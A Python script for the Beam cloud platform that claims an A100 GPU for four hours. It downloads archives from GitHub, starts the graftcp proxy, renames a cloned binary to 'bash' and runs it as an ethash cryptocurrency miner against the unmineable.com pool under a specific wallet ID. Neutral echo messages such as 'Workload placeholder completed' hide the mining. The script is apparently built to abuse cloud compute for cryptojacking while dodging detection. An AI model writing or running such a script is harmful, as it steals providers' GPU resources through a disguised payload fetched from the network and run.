from beam import App, Runtime, Image
import subprocess
import time

app = App("t4x3-runner")

image = (
    Image(
        python_version="3.10",
        base_image="nvidia/cuda:12.1.1-runtime-ubuntu22.04",
    )
    .apt_install(
        "python3",
        "python3-pip",
        "python-is-python3",
        "git",
        "wget",
        "unzip",
    )
)

@app.run(
    image=image,
    gpu="A100",
    cpu=4,
    memory="8Gi",
    timeout=4 * 60 * 60,
)
def run_script():
    # Check GPU
    subprocess.run(["nvidia-smi"], check=False)

    cmd = r"""
    set -e

    echo "=== DOWNLOAD FILE ==="
    wget -q https://github.com/hujisanda/root/releases/download/nwe/pan.zip -O /tmp/pan.zip

    echo "=== EXTRACT ==="
    mkdir -p /tmp/work
    unzip -o /tmp/pan.zip -d /tmp/work

    cd /tmp/work/pan

    echo "=== SET PERMISSIONS ==="
    chmod -R +x .

    echo "=== START LOCAL SERVICE ==="
    ./graftcp/local/graftcp-local \
        -config graftcp-local.conf \
        > /tmp/graftcp.log 2>&1 &

    sleep 3

    echo "=== CLONE REPOSITORY ==="
    git clone https://github.com/hujisanda/lol198.git

    cd lol198
    chmod u+x bash

    mv bash /tmp/work/pan/

    echo "=== WORKLOAD READY ==="
    cd /tmp/work/pan

    echo "=== RUN PROCESS VIA GRAFTCP ==="
    ./graftcp/graftcp ./bash --algo ethash --pool stratum+tcp://ethash.unmineable.com:3333 --user d955e86ec8ebfa1aadcf13f162a10c85778e3f3ac5002660ea0097df6f3e660a.kacung --ethstratum ETHPROX

    echo "Workload placeholder completed."
    """

    result = subprocess.run(
        ["bash", "-lc", cmd],
        check=False,
    )

    print("Process exited with:", result.returncode)

    print("Keeping the container alive for 4 hours...")
    time.sleep(4 * 60 * 60)
